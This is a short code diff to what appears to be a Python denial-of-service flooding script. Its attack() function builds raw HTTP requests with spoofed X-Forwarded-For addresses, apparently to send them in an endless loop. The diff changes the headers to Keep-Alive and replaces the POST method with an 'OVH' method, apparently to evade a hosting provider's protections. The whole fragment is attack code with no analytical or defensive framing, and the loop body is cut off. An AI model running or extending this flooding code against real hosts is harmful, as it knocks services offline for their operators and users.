@@ -25,10 +25,10 @@ def randomip():
 
 
 def attack():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
+  connection = "Connection: Keep-Alive\r\n"
+  referer = "Referer: Keep-Alive\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "POST " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+  get_host = "OVH " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
